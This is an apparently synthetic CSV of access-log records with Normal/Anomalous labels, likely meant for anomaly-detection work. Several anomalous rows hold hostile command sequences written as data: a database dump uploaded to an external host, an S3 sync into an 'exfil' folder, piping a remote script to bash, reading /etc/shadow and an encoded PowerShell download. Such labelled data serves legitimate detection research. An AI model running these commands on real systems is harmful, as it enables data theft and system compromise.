entity_id,entity_type,timestamp,source_ip,geo_location,resource_accessed,auth_method,session_duration,command_sequence,device_fingerprint,login_success,label
a9d42440-55be-4f04-abe3-942de771d53e,Service Account,2025-11-20T21:11:22,231.132.165.13,"South Marilynhaven, Germany",GitLab,API Key,22762,kubectl get pods -> kubectl logs,App Server,1,Normal
386c643b-a54c-44bc-a498-c4df92b8a38d,Device,2025-11-20T21:21:23,160.22.204.88,"North Taylorside, Mexico",AWS Console,Password,10757,N/A,App Server,1,Normal
11119b73-0d69-4a3d-b9b6-c4bd276cc96a,Device,2025-11-20T22:04:01,39.19.140.109,"New Jordanton, Canada",VPN,SSO,18841,N/A,Load Balancer,1,Normal
90b51a3f-cfcc-44e5-98b8-f22a480dfa2b,User,2025-11-20T22:35:12,76.204.211.244,"New Marilynton, Netherlands",Database,Password,20903,N/A,iOS 17 - Safari Mobile,1,Normal
c28586a8-1f86-4383-ac39-f60e6609d3eb,Device,2025-11-20T23:19:27,136.157.195.8,"East Matthewhaven, France",GitLab,Password,11966,SELECT * FROM records,Build Agent,1,Normal
bb657f44-376f-4556-bfdc-6d8cf1101edd,User,2025-11-21T00:02:39,88.99.125.115,"Port Jordanhaven, Mexico",Email,MFA,3040,N/A,Windows 10 - Chrome,1,Normal
3d919fd8-b08b-42ec-bb9c-dbcbcd4c5092,User,2025-11-21T01:39:18,8.173.232.76,"Port Riveraford, Mexico",Database,Hardware Token,16169,terraform plan -> terraform apply,Ubuntu 22.04 - Chrome,1,Normal
d7bedc39-c0e2-463b-bffa-46d95f86b192,Service Account,2025-11-21T02:15:53,169.182.118.60,"North Brandonton, Ghana",App Server,API Key,6731,terraform plan -> terraform apply,App Server,1,Normal
41b9e14e-665d-4e50-a336-9988c2de26b6,Service Account,2025-11-21T02:25:57,213.64.36.49,"Fort Morganmouth, Australia",AWS Console,API Key,48851,pg_dump --all -> gzip -> curl upload external-ip,Build Agent,0,Anomalous
b9cda8b2-86d8-4f4d-b610-fe160abea289,Service Account,2025-11-21T03:26:08,112.79.17.252,"Port Taylorhaven, Andorra",App Server,API Key,7269,N/A,Build Agent,1,Normal
0d2b9a7d-4047-4e1b-b7d8-d022a0e9374f,Device,2025-11-21T03:54:16,80.16.14.220,"New Hallside, United Kingdom",VPN,SSO,6886,N/A,Container Host,1,Normal
df5b61f8-f85d-436d-9a50-0cbaa8ee0c4d,Device,2025-11-21T05:18:41,25.66.193.217,"Lake Ricardoborough, Mexico",Database,Hardware Token,11428,N/A,Build Agent,1,Normal
15077b7d-7edd-4b27-98df-73d01e0dec5e,User,2025-11-21T05:28:38,119.32.132.50,"New Matthewton, Ghana",SharePoint,SSO,19308,N/A,iOS 17 - Safari Mobile,1,Normal
f64d440e-8f87-459e-82c7-6db8db29a41c,Service Account,2025-11-21T05:57:44,60.21.118.253,"West Hallborough, Netherlands",App Server,SSO,14326,N/A,IoT Gateway,1,Normal
7acf9590-054c-44aa-b850-ca66b525c415,Device,2025-11-21T08:30:22,86.151.191.150,"Fort Morganstad, United States",AWS Console,SSO,5438,SELECT * FROM records,IoT Gateway,1,Normal
a81c6a05-bdc3-4a12-91a9-3a6b76432985,Service Account,2025-11-21T09:03:42,130.108.244.14,"Port Stevensstad, United Kingdom",AWS Console,API Key,12160,N/A,IoT Gateway,1,Normal
2aae5639-c31b-4104-a5d4-105c56fc361f,User,2025-11-21T09:35:08,230.254.94.239,"New Taylorville, Uganda",CRM,Biometric,20162,N/A,macOS 13 - Safari,1,Normal
b638de20-06f7-4f70-8876-330b614bb6be,Device,2025-11-21T10:40:01,36.212.52.25,"East Morganville, Mexico",Database,SSO,4480,git pull -> git push,IoT Gateway,1,Normal
e4662fb3-463a-4304-ae48-6f6509203894,Device,2025-11-21T10:48:15,72.82.188.223,"North Theresaside, Mexico",VPN,Hardware Token,2225,N/A,App Server,1,Normal
d8fe1e8a-315f-4200-a7c3-b0649dbeb93a,Device,2025-11-21T10:53:03,55.83.161.102,"North Vasquezford, Uganda",VPN,Hardware Token,10399,N/A,Load Balancer,1,Normal
98e6965e-4933-4364-933e-f7831e29fd3d,Device,2025-11-21T11:44:24,87.195.4.209,"North Stevensville, United Kingdom",GitLab,Password,3069,kubectl get pods -> kubectl logs,Load Balancer,1,Normal
1aba8763-245b-46d2-b8e7-c26dbd80ca34,Service Account,2025-11-21T13:42:12,199.130.17.136,"North Stevensville, Mauritania",GitLab,Hardware Token,4224,ssh -i key.pem -> ls,Build Agent,1,Normal
ef99d291-3ec2-4585-a381-c005b8dd663c,User,2025-11-21T13:50:47,162.183.10.85,"Fort Matthewville, Mexico",Payroll,SSO,1275,N/A,macOS 13 - Safari,1,Normal
db639227-e806-451e-ad67-66d4c8113057,Service Account,2025-11-21T16:17:08,86.174.178.200,"Lake Hallhaven, Mauritania",Database,Hardware Token,16021,ssh -i key.pem -> ls,App Server,1,Normal
1dac32a8-9ce6-4c74-8e60-beb83df1c777,User,2025-11-21T17:26:57,98.208.97.109,"West Brandonside, Ghana",Email,Hardware Token,8913,N/A,Ubuntu 22.04 - Firefox,1,Normal
a761c991-25bf-45a1-b8b3-466792e49538,Service Account,2025-11-21T20:23:40,44.134.67.160,"North Matthewville, Germany",Database,SSO,8490,N/A,Load Balancer,1,Normal
bbf1946d-28ac-4a04-ad36-d8b60b8c65ff,User,2025-11-21T21:36:53,200.242.128.141,"Lake Vasquezton, Mexico",CRM,Password,7010,N/A,Windows 10 - Firefox,1,Normal
b21ec5b5-cffc-4960-b74e-450763d12a9e,User,2025-11-21T22:08:42,124.252.90.72,"Lake Theresaburgh, Ghana",Database,Password,14750,N/A,Windows 10 - Firefox,1,Normal
d519ea29-b051-43fd-8a82-718a6543a413,Service Account,2025-11-21T22:28:24,128.162.133.50,"South Brandonstad, Mauritania",Database,API Key,3833,SELECT * FROM records,Build Agent,1,Normal
dd003ff6-19cf-49d9-afd1-70be4d114d12,Device,2025-11-22T01:36:02,137.29.37.170,"East Stevensstad, Ghana",Database,Hardware Token,4410,terraform plan -> terraform apply,Container Host,1,Normal
e6341656-2d3d-4989-b242-8581a0901a65,Device,2025-11-22T06:51:14,200.129.86.13,"East Ricardoton, Canada",AWS Console,SSO,9841,UPDATE records -> pg_dump,Load Balancer,1,Normal
7c8000d0-fc75-45eb-be30-a6bb5533e176,User,2025-11-22T06:54:22,93.154.93.161,"West Taylorside, Ghana",Database,SSO,18945,N/A,Windows 10 - Chrome,1,Normal
d747d3d0-be26-43e7-9e5e-aa0ebbeb4004,User,2025-11-22T07:34:27,70.151.49.51,"East Stevensborough, France",Payroll,MFA,3730,N/A,macOS 13 - Chrome,1,Normal
5fbb9bdb-450b-4524-b12d-3964ecb4549a,Device,2025-11-22T11:10:09,173.133.228.70,"North Stevensstad, Uganda",GitLab,SSO,14936,ssh -i key.pem -> ls,App Server,1,Normal
1c4f5456-5953-472d-b8bd-435bf862844c,User,2025-11-22T14:48:06,95.97.177.214,"North Brandonside, Andorra",CRM,Hardware Token,8637,N/A,Ubuntu 22.04 - Firefox,1,Normal
cca949a1-48a3-4516-90b6-77327585fe47,User,2025-11-22T18:40:49,244.145.238.89,"South Vasquezview, Canada",CRM,SSO,582,N/A,Windows 10 - Firefox,1,Normal
5660ed27-9f7b-4eb5-b722-21dbea916fd5,Device,2025-11-22T18:54:59,84.147.89.138,"Fort Taylorhaven, United Kingdom",App Server,Hardware Token,6492,N/A,Load Balancer,1,Normal
3a603d84-6e2b-4378-9853-734a2374f200,Service Account,2025-11-22T19:37:34,188.56.75.133,"New Vasquezview, Andorra",GitLab,API Key,24341,UPDATE records -> pg_dump,IoT Gateway,1,Normal
d259558b-82d5-4d52-a4d6-993c355e5a77,Service Account,2025-11-22T20:39:15,89.31.35.49,"New Vasquezstad, United States",AWS Console,API Key,13055,terraform plan -> terraform apply,Container Host,1,Normal
201cf625-169b-4915-8369-0c047ca98676,Service Account,2025-11-22T21:04:24,50.252.178.227,"New Theresaside, United Kingdom",AWS Console,SSO,15121,ssh -i key.pem -> ls,IoT Gateway,1,Normal
5be4fbaf-5965-43b8-ab05-9c019e8c6a97,User,2025-11-22T21:04:56,25.201.146.135,"East Riverahaven, France",Jira,SSO,18396,N/A,macOS 14 - Safari,1,Normal
5bb10ef0-4a1c-49d4-97d4-0611c4e3a366,Service Account,2025-11-22T21:34:35,51.86.174.133,"Port Ricardohaven, Ghana",AWS Console,Hardware Token,60498,ssh -i key.pem -> aws s3 sync s3://internal-data /tmp/exfil,Build Agent,0,Anomalous
5fd596fc-3c0b-4870-b9d8-b2753c279712,Service Account,2025-11-22T21:49:33,167.190.59.15,"New Vasquezborough, Germany",Database,SSO,19923,N/A,App Server,1,Normal
c93d6d05-01e1-4bc7-b478-d467e179e266,Device,2025-11-22T22:00:57,160.17.164.122,"Lake Morganton, Uganda",App Server,Hardware Token,15409,N/A,Container Host,1,Normal
27b38da3-88c6-49d3-82ed-770fd97e48c3,Device,2025-11-22T22:23:38,57.4.127.127,"Fort Morganhaven, Chile",AWS Console,Hardware Token,20563,N/A,Load Balancer,1,Normal
c593dff5-975f-4102-aa3e-bfd5b18c160a,Device,2025-11-23T00:47:22,181.34.238.63,"North Matthewside, Ghana",AWS Console,Password,14301,kubectl get pods -> kubectl logs,Load Balancer,1,Normal
dd408e61-d7b9-4de1-85a1-1fea414eafc9,User,2025-11-23T01:38:26,142.157.168.157,"New Ricardohaven, Sudan",VPN,Password,86359,curl malicious-payload.sh | bash,macOS 14 - Safari,0,Anomalous
7be382c9-358a-421b-9f5b-3e4fec9842ad,User,2025-11-23T01:46:28,45.62.94.83,"East Taylorford, United Kingdom",Slack,Hardware Token,2420,N/A,macOS 13 - Chrome,1,Normal
f11129e9-e979-4529-a671-0db43f0ea8f3,Device,2025-11-23T01:51:53,63.69.14.173,"Fort Brandonburgh, Canada",App Server,SSO,20893,git pull -> git push,Build Agent,1,Normal
6c4fcd40-7fd3-44f6-9180-6ac0129c5e4c,User,2025-11-23T02:27:24,151.16.236.115,"West Theresaton, United Kingdom",HRIS,Hardware Token,15830,N/A,Ubuntu 22.04 - Firefox,1,Normal
99578234-3c37-4a71-bff1-7daf865841c1,User,2025-11-23T02:45:54,253.197.108.219,"Lake Brandonford, Mauritius",Jira,MFA,4771,N/A,Windows 10 - Chrome,0,Normal
215ad8a7-bb8e-4474-871c-e4d09baf48d6,Device,2025-11-23T03:00:55,127.0.164.180,"West Ricardoview, United States",Database,Password,21198,N/A,Container Host,1,Normal
3fe94ad0-1274-4ba4-af9a-7a8c7d735f55,Service Account,2025-11-23T03:13:38,252.188.98.128,"South Brandonville, United Kingdom",AWS Console,SSO,10584,ssh -i key.pem -> ls,Build Agent,1,Normal
001f8009-4964-4641-8f40-484aeb82360d,Service Account,2025-11-23T03:30:26,182.217.178.43,"New Marilynstad, Canada",Database,Hardware Token,7231,N/A,Container Host,1,Normal
2fe1fced-e1df-4adc-b32d-03a542c22574,Service Account,2025-11-23T03:43:53,234.56.140.201,"North Taylorville, Mauritius",AWS Console,Hardware Token,48,whoami -> sudo su -> cat /etc/shadow,Container Host,0,Anomalous
5fe11431-4deb-47f2-97c5-b2cef51d4f69,User,2025-11-23T03:48:08,125.245.186.85,"Port Matthewstad, Mauritius",Jira,Password,3125,N/A,Windows 11 - Chrome,1,Normal
f8d20b4c-91dd-4724-99dc-7ac7c659fe02,User,2025-11-23T05:32:38,218.49.197.35,"Lake Stevenshaven, Uganda",Jira,Biometric,1597,N/A,macOS 14 - Safari,1,Normal
3f072941-215d-4697-bf2e-7bd85702ce10,Device,2025-11-23T06:05:21,6.0.207.184,"New Stevenston, Ghana",App Server,SSO,8527,SELECT * FROM records,App Server,1,Normal
9c3dddb4-5043-4ba9-92cf-ae97619d83b5,Device,2025-11-23T06:11:04,245.231.16.79,"Fort Theresaborough, United Kingdom",Database,SSO,19205,N/A,Container Host,1,Normal
4ac747c5-dd4a-415e-89a3-845323fbb1e5,Service Account,2025-11-23T06:56:32,74.64.124.239,"Fort Riveraville, Sudan",Database,Hardware Token,59,ssh -i key.pem -> aws s3 sync s3://internal-data /tmp/exfil,App Server,0,Anomalous
dc7e9317-fd14-4c98-b141-223c9923fc04,Device,2025-11-23T07:39:30,89.127.94.232,"South Matthewview, Mauritania",GitLab,Hardware Token,3558,N/A,Load Balancer,1,Normal
5e60b76c-1cbf-4058-8d08-f45c21d0c751,Service Account,2025-11-23T07:56:46,238.135.235.253,"Lake Riveraville, Australia",AWS Console,Hardware Token,8559,N/A,Build Agent,1,Normal
698c5d34-1425-4591-9529-c223924a86a2,User,2025-11-23T08:43:04,187.37.108.94,"West Matthewside, Australia",CRM,Password,2601,N/A,Windows 10 - Chrome,1,Normal
738df433-894d-400c-9f04-08f8e4ec7718,Device,2025-11-23T08:57:42,139.98.166.19,"Fort Jordanton, Canada",Database,Hardware Token,10606,ssh -i key.pem -> ls,IoT Gateway,1,Normal
133442be-deb9-4ea8-af01-496bac7f8a17,User,2025-11-23T08:58:42,74.112.74.118,"East Marilynview, Ghana",Database,SSO,12879,N/A,macOS 13 - Chrome,1,Normal
b46e0b2e-8fb1-422e-b4d9-4e940f0327e7,Service Account,2025-11-23T10:14:13,156.100.221.174,"South Riveraside, Mauritius",Database,SSO,2124,N/A,Container Host,1,Normal
bf31afd2-7787-478a-9211-11db773ed7ab,User,2025-11-23T10:58:59,244.37.194.26,"Lake Hallhaven, Uganda",Database,Biometric,4795,ssh -i key.pem -> ls,macOS 14 - Safari,1,Normal
b5db419e-5a0c-4e1f-91e5-9a1191c349bb,Device,2025-11-23T12:17:52,200.108.12.213,"North Jordanburgh, Chile",AWS Console,Hardware Token,9204,N/A,Build Agent,1,Normal
78983047-8299-4a95-997d-c50787faae6e,User,2025-11-23T15:19:59,168.232.101.146,"East Hallside, Uganda",CRM,SSO,17949,N/A,Windows 11 - Chrome,1,Normal
58d81b7c-6155-46e4-b953-5d835b7c2082,User,2025-11-23T16:27:41,144.27.144.129,"New Hallborough, Germany",Database,Password,3576,SELECT * FROM records,macOS 14 - Safari,1,Normal
cd0d2ae1-af6a-4d75-bd20-6d2601c6beba,User,2025-11-23T21:51:08,252.217.46.233,"New Riveraton, Uganda",Jira,SSO,1003,N/A,Windows 11 - Chrome,1,Normal
36f8c3b8-6007-4141-b20e-23a1db52556b,Service Account,2025-11-23T22:38:49,153.24.219.68,"Port Hallview, Andorra",Database,SSO,10770,N/A,Load Balancer,1,Normal
9f05c5fc-d393-4002-b0f9-e4194d5b44c9,User,2025-11-24T01:13:57,67.162.0.197,"East Theresaford, Mauritius",VPN,MFA,22898,N/A,Ubuntu 22.04 - Firefox,1,Normal
15f97c3c-af0b-4c4b-a79c-adff09688f94,User,2025-11-24T02:26:44,41.6.161.180,"Lake Matthewside, Andorra",SharePoint,Biometric,22627,N/A,macOS 13 - Chrome,1,Normal
40b7e9a6-71c7-4f9a-819e-7c0bc96f13d6,Service Account,2025-11-24T02:39:44,32.214.47.202,"Port Jordanhaven, United States",CI/CD Pipeline,SSO,19028,pg_dump,Build Agent,1,Normal
f209d42c-0d2d-4363-bfae-1ff21b6d3537,Service Account,2025-11-24T03:27:24,136.163.87.159,"Fort Theresaview, Mauritius",GitLab,SSO,13709,terraform plan -> terraform apply,Container Host,1,Normal
f8b61c9e-1446-45c5-b449-ba6fcb738648,Device,2025-11-24T03:53:14,50.27.118.56,"Port Riveraton, United Kingdom",GitLab,Password,23685,SELECT * FROM records,Load Balancer,1,Normal
cce75af4-348c-4e79-b23b-5b29fe2b1988,Service Account,2025-11-24T04:02:23,36.223.162.154,"West Vasquezmouth, France",CI/CD Pipeline,API Key,674,ssh -i key.pem -> ls,Container Host,1,Normal
e7c66101-7cda-4402-875a-fc9cb046c050,Device,2025-11-24T05:58:55,24.198.81.8,"Lake Ricardoborough, Chile",App Server,Password,20563,N/A,Load Balancer,1,Normal
6ef6b12d-e0da-4f1d-909f-50390f9f7850,Device,2025-11-24T07:14:14,108.190.48.100,"East Theresaside, Uganda",App Server,SSO,14893,UPDATE records -> pg_dump,Container Host,1,Normal
49561863-46a8-4c69-bdb2-882822079652,Service Account,2025-11-24T09:17:38,126.157.88.200,"South Theresahaven, Netherlands",App Server,SSO,19324,SELECT * FROM records,App Server,1,Normal
f18df04a-b66d-4e9e-9fda-48fb6a7540c2,Device,2025-11-24T10:06:18,162.22.41.125,"South Brandonmouth, Germany",App Server,SSO,8191,N/A,IoT Gateway,1,Normal
288c38dc-f575-4563-8a14-ff21530fb437,User,2025-11-24T10:58:11,154.161.230.54,"North Hallview, Uganda",SharePoint,Biometric,20071,N/A,Windows 11 - Edge,1,Normal
e2fb7579-ec40-4902-b87e-a49c06bc7d9b,User,2025-11-24T10:58:39,225.16.2.240,"North Morganview, Mexico",HRIS,Biometric,11212,N/A,Windows 10 - Chrome,1,Normal
fc7bbc88-6be2-4dfa-acf3-6d01953bfa22,Service Account,2025-11-24T11:05:11,1.61.61.1,"New Taylorville, Uganda",AWS Console,Hardware Token,13014,N/A,App Server,1,Normal
7564f125-d28c-46b2-95a1-84a18db7436f,Service Account,2025-11-24T11:05:58,234.189.109.129,"New Jordanton, Canada",App Server,Hardware Token,3747,git pull -> git push,Load Balancer,1,Normal
0510b6c2-c404-4cfa-b885-94e727b9214b,Device,2025-11-24T11:06:56,222.137.194.43,"Port Vasquezford, Andorra",App Server,Password,2841,N/A,IoT Gateway,1,Normal
55d26f56-2887-4ab5-ae80-5810c7f40a86,User,2025-11-24T11:07:48,121.146.122.39,"Lake Stevensville, Ghana",VPN,SSO,5143,N/A,Android 14 - Chrome Mobile,1,Normal
0750a223-2dc0-421b-802f-85408cf95013,Device,2025-11-24T11:14:25,228.116.71.102,"New Marilynford, Netherlands",GitLab,Hardware Token,23184,git pull -> git push,App Server,1,Normal
2895b6a9-3377-4cec-b978-ab4cba3ca89b,Service Account,2025-11-24T11:28:18,148.147.28.211,"East Brandonville, Uganda",App Server,Hardware Token,12931,ssh -i key.pem -> ls,IoT Gateway,1,Normal
7b7bec22-e797-4053-b29c-749805856376,Device,2025-11-24T12:48:45,226.67.146.199,"South Riveraburgh, Ghana",Database,SSO,7818,N/A,App Server,1,Normal
8b942f02-688e-44c6-b1be-dcec3ede7146,User,2025-11-24T12:48:49,168.32.219.8,"East Taylorton, Ghana",SharePoint,Password,8222,N/A,macOS 14 - Safari,1,Normal
69a8fa91-6d2c-4d7a-b8aa-5f5b2cec46bf,Service Account,2025-11-24T13:24:48,95.12.101.173,"East Taylormouth, Ghana",CI/CD Pipeline,Hardware Token,12728,SELECT * FROM records,Build Agent,1,Normal
70424917-d036-4017-8c27-c86daed6a5b4,User,2025-11-24T14:28:01,14.159.106.101,"East Vasquezford, Netherlands",CRM,Password,23634,N/A,macOS 13 - Safari,1,Normal
ba868199-c967-4945-b058-194fd28df37a,Service Account,2025-11-24T14:35:00,68.7.16.71,"Fort Jordanside, Mauritius",App Server,Hardware Token,3590,N/A,Load Balancer,1,Normal
73c4780c-e5f1-4163-9662-44e911433f72,Device,2025-11-24T15:01:27,174.157.187.29,"West Vasquezside, United Kingdom",Database,Password,5119,N/A,App Server,1,Normal
e76045da-b578-41cb-835a-757cee30bc35,Device,2025-11-24T15:12:27,186.51.177.76,"North Morganville, Andorra",App Server,Password,6044,UPDATE records -> pg_dump,App Server,1,Normal
e6e801c3-efa2-474a-b3d4-c1e2a122b8f2,Service Account,2025-11-24T17:35:07,73.22.205.147,"Lake Vasquezford, Ghana",Database,Hardware Token,15672,N/A,Load Balancer,1,Normal
9c0cd4df-6429-478c-83fd-a3430dcb5af8,Device,2025-11-24T17:38:43,206.144.46.173,"Lake Stevensborough, Australia",VPN,Hardware Token,2285,N/A,Container Host,1,Normal
f6f68df9-2575-48c9-a9b0-f3d73b2d3ae4,User,2025-11-24T17:59:27,101.87.106.177,"South Ricardoside, France",HRIS,SSO,10433,N/A,Android 14 - Chrome Mobile,1,Normal
ddbd0685-ab3e-4dd5-ac36-d4c68dcff5ee,User,2025-11-24T18:48:51,86.63.23.32,"Fort Hallborough, United Kingdom",Email,Biometric,14730,N/A,iOS 17 - Safari Mobile,1,Normal
41515168-32be-4a48-9b2b-25a627b2c4a2,User,2025-11-24T19:10:44,177.138.133.148,"Port Hallside, Mauritania",SharePoint,Hardware Token,9813,N/A,Windows 11 - Chrome,1,Normal
d5cbd9d4-b62d-4f64-8460-37a219e454cc,Service Account,2025-11-24T19:32:30,28.89.47.241,"Fort Marilynmouth, Mauritania",CI/CD Pipeline,Hardware Token,784,N/A,Container Host,1,Normal
1a1bc9e6-d659-44e7-b980-9222e9b6f683,Device,2025-11-24T20:07:44,180.10.9.49,"West Morganmouth, United Kingdom",App Server,Password,6983,pg_dump,App Server,1,Normal
65b9a45b-a737-4828-bc7b-8d2bacc3ab9c,Service Account,2025-11-24T21:11:52,165.93.186.24,"East Marilynside, Mauritania",App Server,Hardware Token,9423,N/A,IoT Gateway,1,Normal
0b6ba9e8-9a9b-49e0-863b-688f573f873e,User,2025-11-24T21:39:44,161.204.147.19,"Lake Matthewmouth, Ghana",HRIS,MFA,8835,N/A,macOS 13 - Chrome,1,Normal
bd33cb5d-5d1b-4dbc-a778-4fecd48ff9cb,Device,2025-11-24T22:30:57,51.138.56.238,"East Ricardoton, Andorra",AWS Console,Hardware Token,10768,kubectl get pods -> kubectl logs,Load Balancer,1,Normal
828be04b-97cb-41d2-8b54-c6be42bcbbaf,Service Account,2025-11-24T23:44:01,97.232.57.136,"Lake Hallside, United Kingdom",GitLab,Hardware Token,21594,N/A,IoT Gateway,1,Normal
eb96daa3-ead2-48aa-b39b-f4ee064a6300,Service Account,2025-11-25T01:27:39,175.164.225.195,"Fort Taylormouth, Andorra",App Server,API Key,9171,N/A,Load Balancer,1,Normal
d3300669-e8dd-4701-abeb-0a77539464d5,User,2025-11-25T02:10:09,183.225.15.123,"East Riveramouth, Mauritania",Slack,SSO,52833,powershell -enc <base64> -> Invoke-WebRequest,macOS 13 - Chrome,1,Anomalous
2ff440df-6c70-484b-bdc1-eed24f63e98c,Device,2025-11-25T02:17:19,75.210.145.163,"Lake Theresaborough, Germany",VPN,Hardware Token,22029,N/A,Load Balancer,1,Normal
9fa46070-58cb-4a58-9574-7a647e8eaac9,Service Account,2025-11-25T03:17:08,122.205.199.242,"North Taylormouth, Ghana",App Server,SSO,11237,N/A,Build Agent,1,Normal
106df38d-679e-4f72-94c8-0b7531697239,User,2025-11-25T03:51:29,103.250.230.205,"East Ricardostad, Chile",SharePoint,Password,80826,N/A,Windows 10 - Firefox,0,Anomalous
b509617f-f605-49ee-b08f-cbcb4533a44e,Service Account,2025-11-25T05:54:52,191.212.220.138,"New Taylorborough, Netherlands",App Server,Hardware Token,18127,terraform plan -> terraform apply,App Server,1,Normal
3c7d0f9e-b098-412a-8f4b-98926d882074,Service Account,2025-11-25T06:23:15,41.195.2.226,"North Morganton, United States",Database,Hardware Token,2097,SELECT * FROM records,Load Balancer,1,Normal
d5ed3f4f-1f02-4842-adf7-32cd8beb972d,Device,2025-11-25T07:15:09,145.12.112.4,"West Vasquezton, United States",AWS Console,Password,11406,git pull -> git push,App Server,1,Normal
500a29e7-ff24-4655-9f3c-3e5787594fab,User,2025-11-25T07:48:44,18.2.76.51,"South Stevensford, Mauritius",Slack,SSO,23691,N/A,macOS 13 - Safari,1,Normal
65d1cc59-b6f8-48f3-affc-930cd9ff75a5,Service Account,2025-11-25T09:40:02,199.216.1.248,"Port Marilynmouth, Mauritania",App Server,API Key,6673,N/A,Build Agent,1,Normal
25a3973d-b025-471a-b733-2af0ca258540,Device,2025-11-25T11:08:41,177.108.56.27,"East Riverastad, Germany",App Server,Password,5044,SELECT * FROM records,Container Host,1,Normal
97697f72-fe70-4d13-a186-daf13457dc5e,User,2025-11-25T11:40:13,29.99.60.21,"East Brandonmouth, Mauritius",Database,Password,8279,N/A,macOS 13 - Chrome,1,Normal
8dc75e1c-ca00-4e36-ae9a-12b657d0262a,Device,2025-11-25T12:05:24,36.233.120.163,"Lake Theresaburgh, Mexico",AWS Console,SSO,1785,N/A,Container Host,1,Normal
d5870b89-8946-443a-af76-604d2f82459b,Service Account,2025-11-25T12:28:08,169.154.182.234,"North Jordanville, Mexico",GitLab,Hardware Token,11932,N/A,IoT Gateway,1,Normal
29890be1-3ec5-4bb9-b66e-d8955cc8447c,User,2025-11-25T12:31:57,102.85.192.3,"New Theresaborough, Ghana",SharePoint,Biometric,905,N/A,Windows 11 - Edge,1,Normal
61516936-1ead-425d-9f07-5ae520498a2d,Service Account,2025-11-25T15:18:58,241.18.212.100,"North Morganhaven, United Kingdom",Database,SSO,21412,N/A,Load Balancer,1,Normal
84cd4b86-d108-495f-99b7-37160e998066,User,2025-11-25T15:54:08,225.237.115.180,"West Stevensville, Chile",SharePoint,Password,3936,N/A,Windows 10 - Chrome,1,Normal
20a75b59-ed08-4995-b20f-6fd44da4088b,User,2025-11-25T17:14:55,217.163.29.79,"East Morganstad, Mauritius",CRM,MFA,18519,N/A,Ubuntu 22.04 - Chrome,1,Normal
df087548-efcb-4904-9541-0b93084d7d93,User,2025-11-25T18:23:42,15.194.62.90,"South Brandonville, Germany",Database,Biometric,3393,git pull -> git push,macOS 13 - Safari,1,Normal
